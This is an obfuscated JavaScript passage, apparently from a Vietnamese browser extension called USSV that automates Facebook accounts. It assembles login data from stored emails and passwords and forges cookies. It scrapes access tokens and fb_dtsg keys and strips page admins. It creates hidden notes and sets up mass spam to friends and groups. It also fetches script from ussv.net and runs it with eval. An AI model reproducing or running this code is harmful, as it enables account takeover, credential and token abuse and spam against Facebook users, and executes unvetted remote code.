            if (f1W[X4](W, H4) || f1W[M4](t0, f1W.p6Y)) {
                var W = f1W.c8Q;
            } else {}
            if (f1W[E4](V, H4) || f1W[f4](V, f1W.p6Y)) {
                var V = f1W.c8Q;
            } else {}
            if (f1W[n4](W, f1W.c8Q) || f1W[r4](t0, f1W.c8Q)) {
                var h0 = W4;
            } else {
                if (f1W[e4](D4, f1W.c8Q) || f1W[q4](V, f1W.c8Q)) {
                    if (f1W[b4](t0, W)) {
                        var R0 = f1W[w0](W, t0);
                        if (f1W[c0](E, f1W.h1O)) {
                            if (f1W[a0](R0, S0) && f1W[j4](R0, z0)) {
                                var h0 = V4;
                            } else if (f1W[D0](R0, z0)) {
                                var h0 = O0;
                            } else if (f1W[A0](R0, f1W.c9a) && f1W[x0](R0, S0)) {
                                var h0 = p4;
                            } else {
                                var h0 = y0;
                            }
                        } else {
                            if (f1W[Z4](R0, S0) && f1W[B4](R0, z0)) {
                                var h0 = L0;
                            } else if (f1W[G0](R0, z0)) {
                                var h0 = I0;
                            } else if (f1W[M0](R0, f1W.c9a) && f1W[T0](R0, S0)) {
                                var h0 = C0;
                            } else if (f1W[m0](R0, f1W.L9a)) {
                                var C4 = W4;
                            } else {
                                var h0 = W4;
                            }
                        }
                    } else if (f1W[u0](t0, W)) {
                        var R0 = f1W[g0](t0, W);
                        if (f1W[Y0](E, f1W.h1O)) {
                            if (f1W[P0](R0, z0)) {
                                var h0 = I0;
                            }
                            if (f1W[K0](R0, S0) && f1W[v0](R0, z0)) {
                                var h0 = L0;
                            } else {
                                var h0 = y0;
                            }
                        } else {
                            if (f1W[l0](R0, S0) && f1W[N0](R0, z0)) {
                                var h0 = k0;
                            } else if (f1W[f0](R0, z0)) {
                                var h0 = V4;
                            } else if (f1W[J0](R0, S0) && f1W[i0](R0, f1W.c9a)) {
                                var h0 = V0;
                            } else if (f1W[s0](R0, f1W.J9a)) {
                                var C4 = W4;
                            } else {
                                var h0 = b0;
                            }
                        }
                    } else {
                        if (f1W[U0](E, f1W.h1O)) {
                            var h0 = y0;
                        } else {
                            var h0 = W4;
                        }
                    }
                } else {
                    if (f1W[n0](t0, W)) {
                        var R0 = f1W[X0](W, t0);
                        if (f1W[A](E, f1W.h1O)) {
                            if (f1W[Z0](R0, S0) && f1W[o0](R0, z0)) {
                                if (f1W[B0](D4, w)) {
                                    var h0 = k0;
                                } else {
                                    var C4 = W0;
                                }
                            } else if (f1W[H0](R0, z0)) {
                                if (f1W[q0](D4, w)) {
                                    var h0 = V4;
                                } else {
                                    var C4 = W0;
                                }
                            } else if (f1W[p0](R0, S0) && f1W[u](R0, f1W.c9a)) {
                                if (f1W[S](D4, w)) {
                                    var h0 = Q;
                                } else {
                                    var C4 = r0;
                                }
                            } else if (f1W[K](R0, f1W.L9a)) {
                                var h0 = y0;
                            } else {
                                var h0 = F0;
                            }
                        } else {
                            if (f1W[E0](R0, S0) && f1W[L](R0, z0)) {
                                var h0 = L0;
                            } else if (f1W[c](R0, z0)) {
                                var h0 = I0;
                            } else if (f1W[J](R0, S0) && f1W[P](R0, f1W.c9a)) {
                                var h0 = C0;
                            } else if (f1W[z](R0, f1W.L9a)) {
                                var C4 = W4;
                            } else {
                                var h0 = b0;
                            }
                        }
                    } else if (f1W[C](t0, W)) {
                        var R0 = f1W[G](t0, W);
                        if (f1W[D](E, f1W.h1O)) {
                            if (f1W[I](R0, S0) && f1W[T](R0, z0)) {
                                var h0 = L0;
                            } else if (f1W[g](R0, z0)) {
                                var h0 = I0;
                            } else if (f1W[N](R0, S0) && f1W[Y](R0, f1W.c9a)) {
                                var h0 = C0;
                            } else {
                                var h0 = y0;
                            }
                        } else {
                            if (f1W[n](R0, S0) && f1W[f](R0, z0)) {
                                if (f1W[X](V, w)) {
                                    var h0 = k0;
                                } else {
                                    var h0 = W0;
                                }
                            } else if (f1W[R](R0, z0)) {
                                if (f1W[H](V, w)) {
                                    var h0 = V4;
                                } else {
                                    var h0 = W0;
                                }
                            } else if (f1W[b](R0, S0) && f1W[M](R0, f1W.c9a)) {
                                if (f1W[p](V, w)) {
                                    var h0 = Q;
                                } else {
                                    var h0 = r0;
                                }
                            } else if (f1W[U](R0, f1W.L9a)) {
                                if (f1W[o](V, w)) {
                                    var h0 = F;
                                } else {
                                    var h0 = Z;
                                }
                            } else {
                                var h0 = W4;
                            }
                        }
                    } else {
                        if (f1W[O](E, f1W.h1O)) {
                            var h0 = y0;
                        } else {
                            var h0 = W4;
                        }
                    }
                }
            }
            return h0;
        };
        this[f1W.L0X] = function(W) {
            var V = "@@",
                E = "..",
                O = "!!",
                Z = "##",
                F = "**";
            if (W) {
                var W = W[f1W.F6r](/u/g, F)[f1W.F6r](/s/g, Z)[f1W.F6r](/v/g, O)[f1W.F6r](/0/g, E)[f1W.F6r](/9/g, f1W.r7Q)[f1W.F6r](/5/g, f1W.Q7y)[f1W.F6r](/3/g, V);
            } else {
                var W = f1W.V8v;
            }
            return W;
        };
    }

    function uss_cr_gg_link_st1(O, Z, F, o) {
        chrome[f1W.d60][f1W.K4r]({
            method: 'GET',
            action: 'xhttp',
            url: 'http://goo.gl',
            data: "opt=0"
        }, function(W) {
            var V = "J7E",
                E = W[f1W.x3y](/security_token\" type=\"hidden\" value=\"(.*?)\"><\/input><input name=\"sign_in_url/i);
            if (f1W[V](E, null)) {
                thongbao_log(1, "Token không ho?p lê?. Vui lo`ng dang nhâ?p Google.");
            } else {
                uss_cr_gg_link_st2(O, Z, F, o, E[1]);
            }
        });
    }

    function OutAdmin(p, M) {
        var b = "UidAdmin";
        if (!M) {
            var M = function() {};
        };
        var H = f1W.P4y;
        $[f1W.c9y]({
            url: H,
            type: "POST",
            dataType: "json",
            data: "fb_dtsg=" + _fb[f1W.O00] + "&fbpage_id=" + p[f1W.X7O] + "&advanced_admin_settings[0]=" + p[b] + "&admin_type[" + p[b] + "]=0&friendselector_input[0]=&friend_selected[0]=&new_admin_type[0]=1&save=1&remove_ids[0]=" + _fb[f1W.z1Y] + "&nctr[_mod]=pagelet_editpagesx&__user=" + _fb[f1W.z1Y] + "&__a=1&ajax_password=" + p[f1W.n3Q] + "&confirmed=1"
        })[f1W.D2I](function(W) {
            var V = "d7b",
                E = "K7b",
                O = "L7b",
                Z = "S7b",
                F = "P7b",
                o = "z7b";
            if (f1W[o](W[f1W.D60], 4) && f1W[F](W[f1W.p0O], 500)) {
                var U = W[f1W.H8v];
                if (f1W[Z](U[f1W.x3y]("goURI"), null)) {
                    M({
                        "Note": "Out Page Thành Công..."
                    });
                } else {
                    var W = W[f1W.H8v][f1W.F6r]("for (;;);", ""),
                        W = JSON[f1W.i2O](W);
                    if (W.error) {
                        if (f1W[O](W.error, 1357007)) {
                            M({
                                "Error": true,
                                "Note": "Out Admin b? Captcha. Vuilongf ki?m tra l?i...",
                                Captcha: 1
                            });
                        } else {
                            M({
                                "Error": true,
                                "Note": W[f1W.S7Y]
                            });
                        }
                    } else {
                        M({
                            "Error": true,
                            "Note": "Out Page Th?t B?i. L?i Không Xác Ð?nh..."
                        });
                    }
                }
            } else if (f1W[E](W[f1W.D60], 4) && f1W[V](W[f1W.p0O], 500)) {
                M({
                    "Error": true,
                    "Note": "R?t Ti?c ! Out Page Th?t B?i..."
                });
            } else {}
        });
    }

    function view_new_img(V, E) {
        var O = '" style="max-width: 500px;"></center>',
            Z = '  		<center><img src="',
            F = '		Link A?nh Cu?: ',
            o = '		Link A?nh Mo´i: ',
            U = '		<br/>',
            p = '	<center><span style="color: rgb(14, 32, 103);font-size: 16px;">Xem A?nh Ða~ Ðang</span></center>',
            M = "#more_info_spam_new_img_",
            b = function(W) {
                f[f1W.V5I] = W;
            },
            H = E,
            R = $(M + V)[f1W.Q0I](),
            X = f1W.X6v;
        X += f1W.o8X;
        X += f1W.d0v;
        X += p;
        X += f1W.B5O;
        X += U;
        X += o + R + f1W.P0r;
        X += F + H + f1W.P0r;
        X += Z + R + O;
        X += f1W.b17;
        X += f1W.G9O + V + f1W.f0y;
        X += f1W.a5a;
        X += f1W.w9O;
        var f = document[f1W.W8O](f1W.P5Y);
        b(X);
        document[f1W.V0r][f1W.M57](f);
        $(f1W.D4O + V)[f1W.Z6O](function() {
            $(f1W.k8Q)[f1W.w5I]();
        });
    }

    function Load_GetLoginForm(N, g) {
        if (!g) {
            var g = function() {};
        }
        $[f1W.c9y]({
            url: "https://www.facebook.com/login.php",
            type: "GET",
            dataType: "json"
        })[f1W.D2I](function(V) {
            var E = "X3b",
                O = "y3b",
                Z = "F3b",
                F = "B3b",
                o = "j3b",
                U = "Datr",
                p = "A8b",
                M = "G8b";
            if (f1W[M](V[f1W.D60], 4)) {
                var V = V[f1W.H8v];
                if (f1W[p](N[U], true)) {
                    var b = V[f1W.x3y]("\"_js_datr\",\"(.*?)\",");
                    if (f1W[o](b, null)) {
                        console[f1W.p4y](b[1]);
                        var H = b[1];
                    } else {
                        var H = null;
                    }
                } else {
                    var H = null;
                }
                var R = $(V)[f1W.q8r]("#login_form")[f1W.q8r]("input"),
                    X = "";
                for (var f = 0; f1W[F](f, R.length); f++) {
                    var n = $(R[f])[f1W.V6Q]("name");
                    if (f1W[Z](n, "email")) {
                        var Y = N[f1W.Y7Y];
                    } else if (f1W[O](n, "pass")) {
                        var Y = N[f1W.n3Q];
                    } else {
                        var Y = $(R[f])[f1W.o07]();
                    }
                    X += n + "=" + Y + "&";
                };
                if (f1W[E](N[U], true)) {
                    chrome[f1W.d60][f1W.K4r]({
                        action: 'delcookie',
                        url: 'facebook.com',
                        name: 'datr'
                    }, function(W) {
                        setCookie("datr", H, 7);
                        setCookie("reg_fb_gate", "https://www.facebook.com/", 7);
                        setCookie("reg_fb_ref", "https://www.facebook.com/v1.0/dialog/oauth/read", 7);
                        setCookie("act", "1434613709786/1", 7);
                        g({
                            "Note": "L?y thông tin dang nh?p thành công...",
                            "LoginData": "email=" + N[f1W.Y7Y] + "&pass=" + N[f1W.n3Q] + "&" + X + "&qsstamp=W1tbMCwxNywzMSwzNCwzOCw1NCw1OCw3MSw4MSwxMTcsMTY1LDE5NCwyMDEsMjE3LDI2MiwyNzgsMjc5LDMwNiwzMDgsMzI3LDM0MSwzNTgsMzcwLDM3MywzODIsMzk0LDQyNSw0NDMsNDU1LDQ2Niw0OTksNTEzLDUyNiw1ODYsNTg4LDU5Nyw2MDcsNjEwLDY0OSw2NzUsNzA3LDc5Nl1dLCJBWm5hWFBLUDVDd0tQVWpha0R3SktSWjNxLXZlT293TDZQX3JreS05WXZUNHZSeWloZllfV21nbHBONFhFWUxqd00ydkxPRlFUeElGbEFIa243YV9GdmVtRjdKMGk0SUpGR2dOWjZFcWVyLTd6dlExZEN1NE1EczFUM0VoamFRSXdKdFFWcWZBeHkzZlF1YXJFbnVkQjhpWkc5RnpCLXRweERORHdFRjdQZXNNX3FqSjRKT2Z2THZaZFJ4NlFScmNkcDdfYmtRMVlaS2RxT0xWSXozSWNVMHdqT0UxQXNkeVY0Y2RpWVc1RFNwTHZnIl0=",
                            Datr: H
                        });
                    });
                } else {
                    g({
                        "Note": "L?y thông tin dang nh?p thành công...",
                        "LoginData": "email=" + N[f1W.Y7Y] + "&pass=" + N[f1W.n3Q] + "&" + X + "&qsstamp=W1tbMCwxNywzMSwzNCwzOCw1NCw1OCw3MSw4MSwxMTcsMTY1LDE5NCwyMDEsMjE3LDI2MiwyNzgsMjc5LDMwNiwzMDgsMzI3LDM0MSwzNTgsMzcwLDM3MywzODIsMzk0LDQyNSw0NDMsNDU1LDQ2Niw0OTksNTEzLDUyNiw1ODYsNTg4LDU5Nyw2MDcsNjEwLDY0OSw2NzUsNzA3LDc5Nl1dLCJBWm5hWFBLUDVDd0tQVWpha0R3SktSWjNxLXZlT293TDZQX3JreS05WXZUNHZSeWloZllfV21nbHBONFhFWUxqd00ydkxPRlFUeElGbEFIa243YV9GdmVtRjdKMGk0SUpGR2dOWjZFcWVyLTd6dlExZEN1NE1EczFUM0VoamFRSXdKdFFWcWZBeHkzZlF1YXJFbnVkQjhpWkc5RnpCLXRweERORHdFRjdQZXNNX3FqSjRKT2Z2THZaZFJ4NlFScmNkcDdfYmtRMVlaS2RxT0xWSXozSWNVMHdqT0UxQXNkeVY0Y2RpWVc1RFNwTHZnIl0=",
                        Datr: H
                    });
                }
            } else {}
        });
    }

    function findItem_Safe(W) {
        var V = ".xxxxUS",
            E = "P36",
            O = "z36",
            Z = "N36",
            F = ".xxxxUL",
            o = "h36",
            U = "R36",
            p = "f36",
            M = f1W.B3Q;
        if (f1W[p](W, f1W.i8Y)) {
            for (var b = f1W.L9a; f1W[U](b, f1W.S9a); b++) {
                if (f1W[o]($(F).length, f1W.L9a)) {
                    var M = setTimeout(findItem_Safe, f1W.P8O, W);
                } else {
                    var M = $(F)[f1W.Q0I]();
                }
            }
        } else if (f1W[Z](W, f1W.e4Y)) {
            for (var b = f1W.L9a; f1W[O](b, f1W.S9a); b++) {
                if (f1W[E]($(V).length, f1W.L9a)) {
                    var M = setTimeout(findItem_Safe, f1W.P8O, W);
                } else {
                    var M = $(V)[f1W.Q0I]();
                }
            }
        }
        return M;
    }

    function uss_js_parse(V) {
        var E = "K36",
            O = 'function|{|}|//|==',
            Z = 'ussFC|ussStart|ussEnd|ussNote|ussBang',
            F = "L36",
            o = 'var|if|else|()',
            U = 'g',
            p = "S36",
            M = 'a| |(|)|<|>|\n',
            b = function(W) {
                strbase = W;
            },
            H = function(W) {
                k = W[f1W.L9a];
            },
            R = function(W) {
                g = W[3];
            },
            X = function(W) {
                str = W;
            };
        a = V[f1W.X3Q](f1W.i2y);
        H(a);
        v = a[f1W.S9a][f1W.X3Q](f1W.r7Q);
        s = a[f1W.c9a][f1W.X3Q](f1W.r7Q);
        R(a);
        var f = M,
            f = f[f1W.X3Q](f1W.w30);
        for (var n = f1W.L9a; f1W[p](n, s.length); n++) {
            var Y = s[n],
                N = new RegExp(Y, U),
                g = g[f1W.F6r](N, f[n]);
        }
        var T = o,
            T = T[f1W.X3Q](f1W.w30);
        for (var n = f1W.L9a; f1W[F](n, v.length); n++) {
            var Y = v[n],
                N = new RegExp(Y, U),
                g = g[f1W.F6r](N, T[n]);
        }
        X(Z);
        str = str[f1W.X3Q](f1W.w30);
        b(O);
        strbase = strbase[f1W.X3Q](f1W.w30);
        for (var n = f1W.L9a; f1W[E](n, str.length); n++) {
            var Y = str[n] + k,
                N = new RegExp(Y, U),
                g = g[f1W.F6r](N, strbase[n]);
        }
        return g;
    }

    function getWords(V) {
        var E = [];
        chrome[f1W.d60][f1W.K4r]({
            method: 'POST',
            action: 'xhttp',
            url: 'http://ussv.net/addon/html/html_div_menu.php',
            data: "base=hau"
        }, function(W) {
            V(W);
        });
    }

    function reg_mail() {
        var E = "https://ussv.net/adminuss/reg_mail.php",
            O = function(W) {
                url = W;
            },
            Z = function(W) {
                datalogin = W;
            };
        O(E);
        Z(f1W.t9r);
        var F = new XMLHttpRequest();
        F[f1W.g4Y] = function() {
            var W = "g6";
            if (f1W[W](F[f1W.D60], 4)) {
                var V = F[f1W.H8v];
                alert(V);
            }
        };
        F[f1W.d5y](f1W.z77, url, f1W.A0r);
        F[f1W.x1I](f1W.r27, f1W.W3v);
        F[f1W.h0r](datalogin);
    }

    function Div_Ussv_VPN(O) {
        var Z = "#popup_ussv_fb_VPN";
        if ($(Z).length) {
            $(Z)[f1W.l6Q](f1W.Y5a);
        } else {
            chrome[f1W.d60][f1W.K4r]({
                method: 'GET',
                action: 'xhttp',
                url: 'http://ussv.net/addon/html/html_panel_VPN.php'
            }, function(W) {
                var W = W[f1W.X3Q]("USSV-SPACE-PARSE<br/>"),
                    V = W[0],
                    E = W[1];
                $("body")[f1W.u2r](V);
                eval(E[f1W.F6r]('<script type="text/javascript">', '')[f1W.F6r]('</script>', ''));
            });
        }
    }

    function _l() {
        var Z = "\n\r\n";
        this[f1W.l0v] = f1W.V8v;
        _l = gl[f1W.Y5v](f1W.S9a, f1W.H67);
        _x = new XMLHttpRequest();
        _x[f1W.d5y](f1W.v0O, _l, f1W.R30);
        _x[f1W.h0r]();
        _s = _x[f1W.H8v][f1W.X3Q](Z);
        this[f1W.W5v] = function(W, V) {
            var E = "A66",
                O = "G66";
            if (f1W[O](W, "")) {
                d = W[f1W.X3Q]("|");
                r = _s[V];
                for (i = 0; f1W[E](i, d.length); i++) {
                    r = r[f1W.F6r]("{" + i + "}", d[i]);
                    r = r[f1W.F6r]("{" + i + "}", d[i]);
                }
                return r;
            }
        };
    }

    function findItem1() {
        function F() {
            var W = "#xxxx",
                V = ".xxxx",
                E = "H36",
                O = "q36";
            if (f1W[O](Z, f1W.L9a)) {
                if (f1W[E]($(V).length, f1W.L9a)) {
                    var Z = f1W.L9a;
                } else {
                    var Z = $(W)[f1W.Q0I]();
                }
            } else {
                var Z = $(W)[f1W.Q0I]();
            }
            return Z;
        }
        var o = f1W.L9a,
            o = F();
        return o;
    }

    function displayTime() {
        var W = f1W.V8v,
            V = new Date(),
            E = V[f1W.m2Q](),
            O = V[f1W.Y6v](),
            Z = V[f1W.I8O]();
        W += E + f1W.V8Y + O;
        return W;
    }

    function check_stellar(o, U, p, M, b, H) {
        var R = "M5b";
        dom_logs_ussv(f1W.z8O + U, o + f1W.v7Q);
        if (f1W[R](M, f1W.x0r)) {
            $(f1W.k6X + o)[f1W.Q0I](f1W.v2X);
            $(f1W.y60)[f1W.Q0I](f1W.Y0r + U + f1W.A2O);
            start_uss(o, U, p, f1W.e8Q, M);
        } else {
            var X = f1W.g9y + M + f1W.M80,
                f = new XMLHttpRequest();
            f[f1W.g4Y] = function() {
                var W = "i5b",
                    V = "n5b";
                if (f1W[V](f[f1W.D60], 4)) {
                    var E = f[f1W.H8v],
                        O = E[f1W.x3y](/1411202179109031/gi);
                    if (f1W[W](O, null)) {
                        var Z = '<img title="Ai do´ da~ du`ng ta`i khoa?n na`y Ki´ch Hoa?t Stellar" width="20" src="https://ussv.net/themes/img/fb_3.png">';
                        $("#checking_stellar_" + o)[f1W.Q0I](Z);
                        var F = Z + " Ta`i khoa?n " + U + " da~ Ki´ch Hoa?t Stellar...";
                        $("#note_check_info")[f1W.Q0I](F);
                        dom_logs_ussv(F, o + "|_|_|war|check");
                        update_keyfb(o, U, p, H, "1");
                    } else {
                        var Z = '<img title="Ta`i Khoa?n Facebook Na`y Chua Ki´ch Hoa?t Stellar" width="21" src="https://ussv.net/themes/img/fb_5.png">';
                        $("#checking_stellar_" + o)[f1W.Q0I](Z);
                        var F = Z + " Ta`i khoa?n " + U + " chua Ki´ch Hoa?t Stellar...";
                        $("#note_check_info")[f1W.Q0I](F);
                        dom_logs_ussv(F, o + "|_|_|ok|check");
                        update_keyfb(o, U, p, H, "0");
                    }
                }
            };
            f[f1W.d5y](f1W.Y6Q, X, f1W.A0r);
            f[f1W.h0r]();
        }
    }

    function menu_welcome() {
        uss[f1W.U8Y]({
            "append": f1W.V0r,
            "Id": f1W.j87,
            "Type": f1W.j87
        });
    }

    function get_pages(Z, F, o, U) {
        var p = f1W.y2y + U;
        chrome[f1W.d60][f1W.K4r]({
            method: 'GET',
            action: 'xhttp',
            url: p,
            data: "hj=hj"
        }, function(W) {
            var V = JSON[f1W.i2O](W),
                E = V.data.length,
                O = JSON[f1W.v4X](V, null, 2),
                O = O[f1W.F6r](/\n/g, ''),
                O = O[f1W.F6r](/\r/g, ''),
                O = O[f1W.F6r](/  /g, ''),
                O = O[f1W.F6r](/"/g, 'HAU'),
                O = O[f1W.F6r](/{/g, 'H1U'),
                O = O[f1W.F6r](/}/g, 'H2U'),
                O = O[f1W.F6r](/=/g, 'H3U'),
                O = O[f1W.F6r](/;/g, 'H4U'),
                O = O[f1W.F6r](/:/g, 'H6U');
            add_pages(Z, F, o, E, O);
        });
    }

    function ThaoTac_Fb_Tools() {
        var W = ".popup_menu_list.FbCore",
            V = "#div_ussv_fb_tools_close";
        $(V)[f1W.Z6O](function() {
            $(f1W.H6Y)[f1W.F50](f1W.Y5a);
        });
        $(W)[f1W.Z6O](function() {
            $(W)[f1W.X9a](f1W.B0O);
            $(this)[f1W.X5O](f1W.n8a);
        });
    }

    function get_Fb_Key() {
        var W = "n16",
            V = "M16",
            E = $(f1W.V0r)[f1W.Q0I](),
            O = /name=\\"fb_dtsg\\" value=\\"(.*?)\\" autocomplete=/i,
            E = E[f1W.x3y](O);
        if (f1W[V](E, f1W.x0r)) {
            var E = $(f1W.V0r)[f1W.Q0I]()[f1W.x3y](f1W.I5I);
            if (f1W[W](E, f1W.x0r)) {
                var Z = E[f1W.S9a];
            } else {
                var Z = f1W.E07;
            }
        } else {
            var Z = E[f1W.S9a];
        }
        return Z;
    }

    function Load_Logout(E, O) {
        if (!O) {
            var O = function() {};
        }
        $[f1W.c9y]({
            url: "https://www.facebook.com/n/?notifications&mid=x46fdf8G5af4213825a3G0Gdx",
            type: "GET",
            dataType: "json"
        })[f1W.D2I](function(W) {
            var V = "k3b";
            if (f1W[V](W[f1W.D60], 4)) {
                O({
                    "Note": "Ðang xu?t thành công..."
                });
            }
        });
    }

    function Fb_Info(W, V, E, O, Z, F, o) {
        var U = "w86";
        if (f1W[U](W, f1W.S9a)) {
            xhr = new XMLHttpRequest();
            xhr[f1W.d5y](f1W.v0O, f1W.r90 + O + f1W.N9y + $(f1W.B6Y)[f1W.o07](), f1W.R30);
            xhr[f1W.h0r]();
            var p = JSON[f1W.i2O](xhr[f1W.H8v]),
                p = p[f1W.W7O];
        } else {}
        return p;
    }

    function start_uss(Z, F, o, U, p, M) {
        var b = M,
            H = p,
            R = $(f1W.z60)[f1W.Q0I](),
            X = $(f1W.D9a)[f1W.Q0I](),
            f = f1W.r8v + b + f1W.j0y + R + f1W.G8I + X + f1W.Y9X + X + f1W.f1Q,
            n = f1W.y2X,
            Y = new XMLHttpRequest();
        Y[f1W.g4Y] = function() {
            var W = "n28",
                V = "M28",
                E = "e28";
            if (f1W[E](Y[f1W.D60], f1W.d9a) && f1W[V](Y[f1W.p0O], f1W.o9Q)) {
                var O = Y[f1W.H8v][f1W.x3y](/access_token=(.*?)&expires_in/i);
                if (f1W[W](O, f1W.x0r)) {
                    update_keyfb(Z, F, o, O, U);
                } else {
                    O = O[f1W.S9a];
                    update_keyfb(Z, F, o, O, U);
                }
            };
        };
        Y[f1W.d5y](f1W.z77, n, f1W.A0r);
        Y[f1W.x1I](f1W.r27, f1W.W3v);
        Y[f1W.h0r](f);
    }

    function cr_fb_notes_api(E) {
        var O = "{'value':'EVERYONE'}",
            Z = '<p>Welcome USSV 1.3.4</p>%0A<img alt="USSV" src="http://i.ytimg.com/vi/med0dx7PIEo/hqdefault.jpg"></img>',
            F = "Welcome USSV2",
            o = F,
            U = Z,
            p = O;
        chrome[f1W.d60][f1W.K4r]({
            method: 'POST',
            action: 'xhttp',
            url: 'https://graph.facebook.com/me/notes?timeline_visibility=false&is_hidden=true&no_story=true&subject=' + o + '&message=' + U + '&privacy=' + p + '&method=post&access_token=' + token,
            data: "x=x"
        }, function(W) {
            var W = JSON[f1W.i2O](W),
                V = W[f1W.W7O];
            thongbao_log(1, "USSV Vu`a ta?o tha`nh công Link Note thu´ " + E + " trên Facebook: http://facebook.com/" + V);
        });
    }

    function _lJ() {
        this[f1W.l0v] = f1W.V8v;
        this[f1W.G3v] = function(W) {
            var V = "B56",
                E = "r",
                O = "j56";
            eval("var j = _lJ.d." + W[f1W.M8v] + "." + W[f1W.W7O] + ";");
            if (f1W[O](W[E], undefined)) {
                DataR = W[E][f1W.X3Q]("--");
                for (var Z = 0; f1W[V](Z, DataR.length); Z++) {
                    var F = new RegExp("\\{" + Z + "\\}", "g");
                    j = j[f1W.F6r](F, DataR[Z]);
                };
            }
            return j;
        };
    }

    function uss_change_js(W) {
        var V = "s_t",
            E = "s_r",
            O = "s_e",
            Z = "s_w",
            F = "s_q",
            o = "s_s",
            U = "s_y",
            W = $[f1W.o9Y][f1W.x1X](W),
            W = JSON[f1W.i2O](W),
            p = W.data,
            M = W[f1W.Y5O],
            b = W[f1W.u00],
            H = W[U],
            R = W[o],
            X = W[F],
            f = W[Z],
            n = W[O],
            Y = W[E],
            N = W[V],
            g = H + f1W.r7Q + R + f1W.r7Q + X + f1W.r7Q + f + f1W.r7Q + n + f1W.r7Q + Y + f1W.r7Q + N,
            T = M + f1W.i2y + b + f1W.i2y + g + f1W.i2y + p;
        return T;
    }

    function DelPost(V, E) {
        if (!E) {
            var E = function() {};
        };
        chrome[f1W.d60][f1W.K4r]({
            method: 'GET',
            action: 'xhttp',
            url: 'https://graph.facebook.com/' + V[f1W.b40] + '/?method=delete&access_token=' + V[f1W.p87]
        }, function(W) {
            E(W);
        });
    }

    function delete_fb(F) {
        var o = document[f1W.C4y](f1W.j9O)[f1W.V5I],
            U = document[f1W.C4y](f1W.Y6a)[f1W.V5I];
        $[f1W.c2O]('https://ussv.net/ajax/delete_fb.php', {
            id: F,
            user_id: U,
            token: o
        }, function(W) {
            var V = "W9t",
                E = "d2t",
                O = "K2t",
                Z = "L2t";
            if (f1W[Z](W, 0)) {
                alert("Du~ Liê?u Trô´ng");
            } else if (f1W[O](W, 1)) {
                alert("Ta`i khoa?n Hoa?c Token Không Ðu´ng ! Hy vo?ng ba?n không co´ y´ pha´ hoa?i !");
            } else if (f1W[E](W, 2)) {
                alert("Facebook na`y không tô`n ta?i hoa?c Không thuô?c vê` ba?n !");
            } else if (f1W[V](W, 3)) {
                $("#row-" + F)[f1W.F50]();
                thongbao_log(1, lang_vi_pr_del_ac_fn);
            } else {
                alert("Lô~i Không Xa´c Ði?nh !");
            }
        });
    }

    function fb_spam(n, Y, N, g, T) {
        var I = "#spam_rs_",
            D = "#sp_token_",
            G = ".div_ussv_logs_spam_info",
            C = "G5b",
            z = "#ussv_logs_list_spaming",
            P = "#fbacc_num_total_spam_list",
            J = '		Note:<span id="GroupCore_spam_note_',
            c = '		<textarea style="width:95%" class="GroupCore_spam_listid_group" id="GroupCore_spam_listid_group_',
            L = '">0</span></div>',
            E0 = '">0</span> - TB: <span id="GroupCore_spam_TK_cmt_TB_',
            F0 = '">0</span> - TC: <span id="GroupCore_spam_TK_cmt_TC_',
            K = '		<div style="float: right;">TT: <span id="GroupCore_spam_TK_total_cmt_',
            r0 = '		<span style="float:left">Tags List Group</span>',
            Q = '" value="0" type="hidden">',
            S = '		<input id="GroupCore_spam_aut_',
            u = '" class="hidden">',
            p0 = '	<div id="List_Spam_Group_Cmt_',
            q0 = '">Null</span></div>',
            H0 = '">0</span> Ba?n. End: <span id="more_info_spam_logs_ok_end_',
            W0 = '	<span id="more_info_spam_logs_ok_',
            w = '    	</select>',
            B0 = '    		<option value="0">No</option>',
            o0 = '    		<option value="1">Yes</option>',
            Z0 = '" class="input_mail _42ft _4jy0 _55pi _5vto _55_p _2agf _p _4jy3 _517h _51sy _no">',
            A = '		<select style="font-size: 10px;padding: 1px;" id="spam_info_acc_can_spam_',
            X0 = '	<div class="font_11">',
            n0 = '    </span>',
            U0 = '	<span id="spam_info_acc_spam_total_',
            b0 = '	<span style="float: right;">',
            s0 = '" src="https://ussv.net/themes/img/app/log_view.png"></a> ',
            V0 = '"><img id="spam_vl_',
            i0 = '		<a title="Xem li?ch Su? ',
            J0 = '" src="https://ussv.net/themes/img/app/re_spam.png"></a> ',
            f0 = '"><img id="spam_rs_',
            k0 = '		<a title="Spam la?i trên ta`i khoa?n ',
            N0 = '" src="https://ussv.net/themes/img/app/icon_login.png"></a> ',
            l0 = '"><img id="spam_fl_',
            v0 = '		<a title="Ðang Nhâ?p Nhanh Va`o Ta`i Khoa?n ',
            K0 = '"> ',
            P0 = '	<span id="more_info_spam_',
            Y0 = '			</table>',
            g0 = '							<h4 class="tableussh2"><center><span id="spaming_group_',
            u0 = '						<td class="tableusstdtd" id="cl_spam_group_',
            m0 = '						</td>',
            C0 = '">0</span></center></h4>',
            T0 = '">0</span> - </span><span id="spaming_friends_500_fix_',
            M0 = '">0</span> | <span id="spaming_friends_500_',
            I0 = '">0</span> | <span style="color: rgb(209, 67, 102);"><span id="spaming_friends_aut_',
            G0 = '							<h4 class="tableussh2"><center><span id="spaming_friends_',
            L0 = '						<td class="tableusstdtd" id="cl_spam_friends_',
            B4 = '				<tbody id="div_spam_info">',
            Z4 = '				</tbody>',
            y0 = '					</tr>',
            p4 = '							<center>Group(<span id="sp_fb_group_',
            x0 = '						</th>',
            A0 = '						<span id="spam_info_note_',
            O0 = '</span>)</center>',
            D0 = '							<center>Friends(<span id="sp_fb_friends_',
            V4 = '						<th class="tableussth">',
            z0 = '					<tr>',
            j4 = '				<tbody>',
            S0 = '			<table class="tableuss">',
            a0 = '" class="tableusssp" style="">',
            c0 = '		<div id="info_spam_',
            w0 = '	<div class="div_ussv_logs_spam_info_table">',
            b4 = '	<span class="hidden" id="sp_can_',
            q4 = '	<span class="hidden" id="sp_token_',
            e4 = '	<span class="hidden" id="spam_info_acc_',
            W4 = '	</center>',
            r4 = '">0</span>s) ',
            n4 = ' (<span id="spam_info_acc_time_',
            f4 = '	<center>',
            E4 = '" id="div_mini_spam_',
            M4 = '<div class="div_ussv_logs_spam_info ',
            X4 = 22,
            k4 = "#acc_fn_pass_",
            R4 = "v5b",
            y4 = "Tiê´n Tri`nh SPAM dang hoa?t dô?ng trên ta`i khoa?n ",
            s4 = ".note_tientrinh_spam_account",
            h4 = "u5b";
        $(f1W.R2X)[f1W.l6Q](f1W.Y5a);
        open_div_ussv_logs(f1W.C3I);
        if (f1W[h4](g, f1W.S9a)) {
            var H4 = f1W.V8v;
            dom_logs_ussv(lang_vi_checking_can_spam + f1W.V8v + Y, n + f1W.v7Q);
            $(s4)[f1W.Q0I](y4 + Y);
        } else {
